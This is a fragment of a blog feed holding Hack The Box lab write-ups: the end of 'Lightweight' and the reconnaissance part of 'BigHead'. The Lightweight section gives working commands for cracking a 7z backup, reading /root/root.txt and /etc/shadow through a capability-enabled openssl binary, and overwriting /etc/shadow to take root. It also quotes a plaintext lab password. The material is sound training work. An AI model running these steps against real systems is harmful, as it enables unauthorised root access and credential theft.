&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/14.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bruteforcing-7z-hardcoded-credentials-privilege-escalation-to-ldapuser1&quot;&gt;Bruteforcing &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt;, Hardcoded Credentials, Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-ldapuser2-there-was-a-backup-file-called-backup7z-i-tried-to-extract-it-but-it-was-password-protected-&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt; there was a backup file called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.7z&lt;/code&gt;. I tried to extract it but it was password protected :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-transferred-it-to-my-box-to-bruteforce-it-nc-wasnt-installed-and-i-couldnt-use-scp-so-i-transferred-it-with-base64-encodingdecoding-&quot;&gt;So I transferred it to my box to bruteforce it (&lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; wasn’t installed and I couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt; so I transferred it with base64 encoding/decoding) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/17.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-used-this-tool-to-bruteforce-the-7z-file-&quot;&gt;I used &lt;a href=&quot;https://github.com/Seyptoo/7z-BruteForce&quot;&gt;this tool&lt;/a&gt; to bruteforce the &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt; file :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python 7z.py backup.7z /usr/share/wordlists/rockyou.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-delete-after-extraction-we-have-some-php-files-looks-like-the-source-of-the-web-site-hosted-on-port-80-&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;delete&lt;/code&gt;. After extraction we have some &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files, Looks like the source of the web site hosted on port 80 :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-them-all-and-in-statusphp-i-found-hardcoded-credentials-for-ldapuser1-&quot;&gt;I checked them all and in &lt;code class=&quot;highlighter-rouge&quot;&gt;status.php&lt;/code&gt; I found hardcoded credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-su-to-ldapuser1-with-the-password--f3ca9d298a553da117442deeb6fa932d-&quot;&gt;Now we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; with the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;f3ca9d298a553da117442deeb6fa932d&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;openssl-capabilities-root-flag&quot;&gt;Openssl Capabilities, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;i-looked-at-the-contents-of-homeldapuser1-and-i-noticed-some-stuff-a-php-file-called-ldaptlsphp-and-two-binaries--openssl-and-tcpdump&quot;&gt;I looked at the contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/ldapuser1&lt;/code&gt; and I noticed some stuff. A &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapTLS.php&lt;/code&gt; and two binaries : &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;cat ldapTLS.php&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nothing-interesting-lets-check-the-binaries-we-dont-need-tcpdump-anymore-so-we-will-focus-on-openssl&quot;&gt;Nothing interesting. Lets check the binaries. (We don’t need &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; anymore so we will focus on &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt;)&lt;/h4&gt;
&lt;h4 id=&quot;i-checked-the-capabilities-and-i-found-that-openssl-has-the-ep-capability-which-means-it-can-read-and-write-anything-on-the-filesystem&quot;&gt;I checked the capabilities and I found that &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; has the &lt;code class=&quot;highlighter-rouge&quot;&gt;ep&lt;/code&gt; capability which means it can read and write anything on the filesystem.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this--means-that-we-can-simply-read-the-root-flag-by-using-the-base64-encoding-function-in-openssl-then-decoding-the-file-&quot;&gt;This  means that we can simply read the root flag by using the base64 encoding function in &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; then decoding the file :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d root.txt.b64&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-also-get-a-root-shell-by-overwriting-etcpasswd-or-etcshadow-i-got-a-copy-of-the-original-shadow-file-first-&quot;&gt;We can also get a root shell by overwriting &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt;. I got a copy of the original &lt;code class=&quot;highlighter-rouge&quot;&gt;shadow&lt;/code&gt; file first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -base64 -in /etc/shadow -out ./shadow.b64&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d shadow.b64 &amp;gt; shadow&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-used-openssl-to-create-a-salted-password-i-used-root-as-the-salt-and-rick-as-the-password-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to create a salted password. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; as the salt and &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; as the password :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl passwd -1 -salt root rick&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-edited-the-copy-i-have-of-etcshadow-and-replaced-the-root-password-with-the-new-one-&quot;&gt;Then I edited the copy I have of &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; and replaced the root password with the new one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-i-used-openssl-to-replace-the-old-etcshadow-with-the-new-one-and-after-that-we-can-do-su-root-with-the-password-rick&quot;&gt;And finally I used &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to replace the old &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; with the new one and after that we can do &lt;code class=&quot;highlighter-rouge&quot;&gt;su root&lt;/code&gt; with the password &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -in shadow -out /etc/shadow&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---bighead&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bighead/&quot;&gt;Hack The Box - BigHead&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---conceal&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/conceal/&quot;&gt;Hack The Box - Conceal&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="ssh" /><category term="Binary Exploitation" /><category term="Networking" /><category term="Forensics" /><summary type="html">Quick Summary Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is 10.10.10.119, I added it to /etc/hosts as lightweight.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lightweight.htb 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first. Ldap Enumeration To enumerate ldap I like to use a tool called ldapsearch, There’s also an nmap script called ldap-search that can do the same thing. ldapsearch : ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot; Full Output : ``` extended LDIF # LDAPv3 base &amp;lt;dc=lightweight,dc=htb&amp;gt; with scope subtree filter: (objectclass=*) requesting: ALL #</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/lightweight/0.png" /></entry><entry><title type="html">Hack The Box - BigHead</title><link href="http://localhost:4000/hack-the-box/bighead/" rel="alternate" type="text/html" title="Hack The Box - BigHead" /><published>2019-05-04T00:00:00+02:00</published><updated>2019-05-04T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/bighead</id><content type="html" xml:base="http://localhost:4000/hack-the-box/bighead/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-bighead-retired-and-heres-my-write-up-about-it-as-you-can-see-its-an-insane-box-actually-its-hard-to-summarize-this-box-as-it-included-a-lot-of-steps-to-achieve-different-goals-most-of-the-steps-require-deep-enumeration-especially-the-initial-foothold-the-part-i-liked-the-most-about-this-box-is-the-win32-buffer-overflow-egghunting-exploitation-as-it-was-very-interesting-the-whole-box-was-challenging-and-the-overall-experience-wasnt-bad-but-i-disliked-the-fact-that-it-had-a-lot-of-trolls-i-found-it-kinda-funny-that-the-box-had-a-lot-of-silicon-valley-references-d-even-the-name-of-the-box-is-the-name-of-one-of-the-characters-anyway-lets-not-waste-more-time-its-a-windows-box-and-its-ip-is-101010112-i-added-it-to-etchosts-as-bigheadhtb-lets-jump-right-in-&quot;&gt;Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of &lt;a href=&quot;https://www.imdb.com/title/tt2575988/&quot;&gt;Silicon Valley&lt;/a&gt; references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.112&lt;/code&gt;. I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC bighead.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;only-one-port-is-open-which-is-port-80-and-its-running-http-lets-take-a-look&quot;&gt;Only one port is open which is port 80 and it’s running http. Let’s take a look.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-a-website-titled-pipernet-comes-the-background-is-an-image-of-the-characters-from-the-tv-show-silicon-valley-and-in-the-middle-its-saying-pipernet-is-here-also-there-are-two-links-down-there-first-one-is-this-is-pipernet-which-is-the-homepage-and-the-other-one-is-piedpipercoin-lets-scroll-down-and-see-what-else-do-we-have-&quot;&gt;It’s a website titled &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperNet Comes&lt;/code&gt;. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;PIPERNET IS HERE&lt;/code&gt;. Also there are two links down there, First one is &lt;code class=&quot;highlighter-rouge&quot;&gt;THIS IS PIPERNET&lt;/code&gt; which is the homepage and the other one is &lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN&lt;/code&gt;. Let’s scroll down and see what else do we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;piedpipercoin-comes-and-theres-a-small-description-of-what-piedpipercoin-is&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN COMES&lt;/code&gt;, and there’s a small description of what piedpipercoin is.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-there-are-some-pictures-for-the-characters-from-silicon-valley-and-some-stuff-about-each-one-of-them-nothing-is-interesting-so-far-at-the-bottom-of-the-page-there-is-this-contact-form-&quot;&gt;After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-looked-at-the-contact-info-and-i-noticed-that-the-email-was-infobachmanityhtb-lets-check-that-domain-but-before-doing-that-i-wanted-to-check-the-other-page-piedpipercoin-&quot;&gt;I looked at the contact info and I noticed that the email was &lt;code class=&quot;highlighter-rouge&quot;&gt;info@bachmanity.htb&lt;/code&gt;. Let’s check that domain, but before doing that I wanted to check the other page &lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;instead-of-piedpipercoin-comes-its-saying-piedpipercoin-came-but-nothing-is-interesting-lets-check-bachmanityhtb-we-need-to-add-it-to-etchosts-first-&quot;&gt;Instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN COMES&lt;/code&gt; it’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN CAME&lt;/code&gt; but nothing is interesting. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;bachmanity.htb&lt;/code&gt;, we need to add it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; first :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/9.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;bachmanity.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-only-that-image-and-nothing-else-&quot;&gt;It’s only that image and nothing else :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;back-to-the-contact-form-i-wanted-to-see-if-its-exploitable-in-any-way-i-filled-all-the-fields-with-test-&quot;&gt;Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-sends-the-request-to-mailerbigheadhtb-lets-add-it-to-etchosts-and-try-again-&quot;&gt;It sends the request to &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer.bighead.htb&lt;/code&gt;, Let’s add it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and try again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/14.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-shows-this-message-then-it-redirects-the-browser-back-to-bigheadhtb-i-also-intercepted-the-request-with-burp-&quot;&gt;It shows this message then it redirects the browser back to &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb&lt;/code&gt;. I also intercepted the request with burp :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;tried-to-manipulate-the-input-but-couldnt-achieve-anything-i-went-to-mailerbigheadhtb-and-got-redirected-to-mailerbigheadhtbtestlink-which-shows-this-error-&quot;&gt;Tried to manipulate the input, but couldn’t achieve anything. I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer.bighead.htb&lt;/code&gt; and got redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer.bighead.htb/testlink&lt;/code&gt; which shows this error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-the-background-i-ran-gobuster-on-bachmanityhtb--and-bigheadhtb-with-usrsharewordlistsdirbcommontxt-bachmanityhtb-didnt-have-anything-&quot;&gt;In the background I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;bachmanity.htb&lt;/code&gt;  and &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;bachmanity.htb&lt;/code&gt; didn’t have anything :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bachmanity.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:21:01 Starting gobuster
=====================================================
/index.html (Status: 200)
/index.htm (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;but-bigheadhtb-gave-some-results-&quot;&gt;but &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb&lt;/code&gt; gave some results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:16:23 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/backend (Status: 302)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-to-assets-and-it-was-forbidden-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/assets&lt;/code&gt; and it was forbidden :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;backend-redirected-the-browser-to-bigheadhtbbighead-which-gave-the-same-error-we-saw-before-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/backend&lt;/code&gt; redirected the browser to &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb/BigHead&lt;/code&gt; which gave the same error we saw before :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-clicked-on-error-log-and-it-gave-the-same-error-&quot;&gt;I clicked on &lt;code class=&quot;highlighter-rouge&quot;&gt;error log&lt;/code&gt; and it gave the same error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-check-if-there-are-any-other-subdomains-i-used-wfuzz-with-subdomains-top1mil-5000txt-from-seclists&quot;&gt;Let’s check if there are any other subdomains. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt&quot;&gt;subdomains-top1mil-5000.txt&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;non-valid-subdomain-responses-are-11232-chars-so-we-will-remove-those-from-the-output-&quot;&gt;non-valid subdomain responses are &lt;code class=&quot;highlighter-rouge&quot;&gt;11232&lt;/code&gt; chars so we will remove those from the output :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-3-subdomains--dev-mailer-and-code-we-already-know-about-mailer-lets-add-dev-and-code-&quot;&gt;We got 3 subdomains : &lt;code class=&quot;highlighter-rouge&quot;&gt;dev&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;. We already know about &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer&lt;/code&gt;, let’s add &lt;code class=&quot;highlighter-rouge&quot;&gt;dev&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;codebigheadhtb-redirected-the-browser-to-1270015080testlinkloginphp&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; redirected the browser to &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:5080/testlink/login.php&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/27.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-to-see-whats-on-codebigheadhtb-we-will-probably-need-to-forward-an-internal-service-to-our-box-we-cant-do-that-now-so-we-will-ignore-codebigheadhtb-for-now&quot;&gt;So to see what’s on &lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; we will probably need to forward an internal service to our box. We can’t do that now so we will ignore &lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; for now.&lt;/h4&gt;
